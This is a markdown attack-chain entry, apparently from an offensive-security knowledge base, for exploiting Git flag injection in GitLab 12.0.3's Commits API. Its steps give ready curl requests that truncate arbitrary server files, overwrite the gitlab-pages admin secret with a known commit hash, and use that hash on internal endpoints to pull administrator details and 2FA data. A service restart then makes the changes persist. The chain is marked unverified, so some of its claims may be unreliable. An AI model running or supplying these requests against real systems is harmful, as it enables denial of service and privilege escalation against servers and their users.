---
id: ac-gitlab-flag-injection-overwrite-escalation
tags:
  - gitlab
  - command-injection
  - file-overwrite
  - privilege-escalation
  - api-vulnerability
  - dos
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/ls]]'
  - '[[tools/cat]]'
  - '[[tools/gitlab-ctl]]'
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
  - '[[Defense Evasion]]'
verified: false
platforms:
  - Web
  - Linux
  - Docker
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-GitLab-Repository-for-Testing]]'
  - '[[procedures/Inject-Malicious-Ref-Name-in-Commits-API]]'
  - '[[procedures/Verify-File-Truncation-with-Ls]]'
  - '[[procedures/Overwrite-GitLab-Secret-File-via-API]]'
  - '[[procedures/Verify-Secret-Overwrite-with-Cat]]'
  - '[[procedures/Access-Internal-APIs-with-Overwritten-Secrets]]'
  - '[[procedures/Restart-Unicorn-to-Persist-Overwrites]]'
step_count: 7
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
  - '[[Stored Data Manipulation]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:24:08.802Z'
description: >-
  Multi-stage attack exploiting unsanitized ref_name parameter in GitLab Commits
  API to inject Git flags, enabling arbitrary file writes, truncation for DoS,
  secret overwrites, and access to internal APIs for privilege escalation.
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
  - '[[Stored Data Manipulation]]'
  - '[[Valid Accounts]]'
---
# GitLab Git Flag Injection Leading to Arbitrary File Overwrite and Privilege Escalation

Multi-stage attack chain demonstrating exploitation of Git flag injection in GitLab's Commits API to achieve file truncation for denial of service, overwrite of secret files with known values, and subsequent privilege escalation via internal API access.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 7 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Repository Setup] --> B[API Injection for File Write]
    B --> C[Verify Truncation]
    C --> D[Overwrite Secrets]
    D --> E[Verify Overwrite]
    E --> F[Access Internal APIs]
    F --> G[Persist Changes]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#f39c12
    style F fill:#3498db
    style G fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/ls]]
- [[tools/cat]]
- [[tools/gitlab-ctl]]

### Target Environment

- GitLab 12.0.3 running on Linux/Docker
- Access to GitLab API (authenticated or public project)
- Gitaly service enabled
- Ports: 80/443 for API access

### Initial Access Requirements

- Valid GitLab user account or API token for project creation
- Network access to GitLab instance (e.g., http://target/api/v4)
- No prior root access needed; exploits public-facing API

## Detailed Attack Procedures

### Step 1: Repository Setup
procedure: [[procedures/Create-GitLab-Repository-for-Testing]]

**Objective**: Create a test repository with commits to enable Git log operations.

**Instructions**: Use GitLab UI or API to create a new project and commit a file.

**Expected Output**: Repository ID (e.g., 5) with at least one commit.

**Success Indicators**:
- Project created successfully
- Initial commit present

### Step 2: API Injection for File Write
procedure: [[procedures/Inject-Malicious-Ref-Name-in-Commits-API]]

**Objective**: Inject Git flag via ref_name to write commit data to an arbitrary file.

**Instructions**: Execute [[commands/curl-gitlab-commits-injection]] to target a test file:

```bash
curl 'http://target/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'
```

**Expected Output**: API returns commits list; backend creates /tmp/written.

**Success Indicators**:
- HTTP 200 response
- File created on server

### Step 3: Verify File Truncation
procedure: [[procedures/Verify-File-Truncation-with-Ls]]

**Objective**: Confirm the target file is created but truncated (empty).

**Instructions**: Run [[commands/ls-verify-file-truncation]] on the server:

```bash
ls -asl /tmp/written
```

**Expected Output**: File shows size 0, e.g., -rw-r--r-- 1 git git 0 /tmp/written.

**Success Indicators**:
- File exists with zero bytes
- Permissions allow verification

### Step 4: Overwrite Critical Secret File
procedure: [[procedures/Overwrite-GitLab-Secret-File-via-API]]

**Objective**: Overwrite a secret file with a known commit hash by sending the request twice.

**Instructions**: Use [[commands/curl-gitlab-secret-overwrite]] twice:

```bash
curl 'http://target/api/v4/projects/5/repository/commits?ref_name=--output=/var/opt/gitlab/gitlab-pages/admin.secret'
```
(Run again immediately after first execution.)

**Expected Output**: Second request writes commit hash without truncation.

**Success Indicators**:
- Secret file modified
- No DoS from truncation

### Step 5: Verify Secret Overwrite
procedure: [[procedures/Verify-Secret-Overwrite-with-Cat]]

**Objective**: Check that the secret file now contains a predictable value.

**Instructions**: Execute [[commands/cat-verify-secret]]:

```bash
cat /var/opt/gitlab/gitlab-pages/admin.secret
```

**Expected Output**: Outputs a known commit hash, e.g., a1b2c3d4.

**Success Indicators**:
- File contents match expected hash
- Original secret replaced

### Step 6: Access Internal APIs
procedure: [[procedures/Access-Internal-APIs-with-Overwritten-Secrets]]

**Objective**: Use the known secret to authenticate to internal endpoints and escalate privileges.

**Instructions**: Send requests with [[commands/curl-internal-check]] and [[commands/curl-internal-discover]]:

```bash
curl -s 'http://target/api/v4/internal/check?secret_token=known_hash'
```

```bash
curl -s 'http://target/api/v4/internal/discover?secret_token=known_hash&user_id=1'
```

**Expected Output**: JSON with system info or user details, e.g., {"id":1,"name":"Administrator"}.

**Success Indicators**:
- Internal API access granted
- Sensitive data retrieved (e.g., 2FA codes)

### Step 7: Persist Overwrites
procedure: [[procedures/Restart-Unicorn-to-Persist-Overwrites]]

**Objective**: Ensure overwrites survive restarts in race condition scenarios.

**Instructions**: Spam API requests (e.g., 32 parallel) then run [[commands/gitlab-ctl-restart-unicorn]]:

```bash
gitlab-ctl restart unicorn
```

**Expected Output**: "ok: run: unicorn: (pid XXX) 1s".

**Success Indicators**:
- Service restarts without reverting overwrites
- Persistence confirmed

## Attack Chain Summary

### Key Achievements

1. Achieved arbitrary file write and truncation via Git flag injection
2. Overwrote GitLab secrets with known values for DoS and escalation
3. Gained access to internal APIs, exposing user data and enabling further attacks

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Unix Shell]]
- [[Stored Data Manipulation]]
- [[Valid Accounts]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Privilege Escalation]]
- [[Defense Evasion]]

---
*Last updated: 2023-10-01T00:00:00Z*
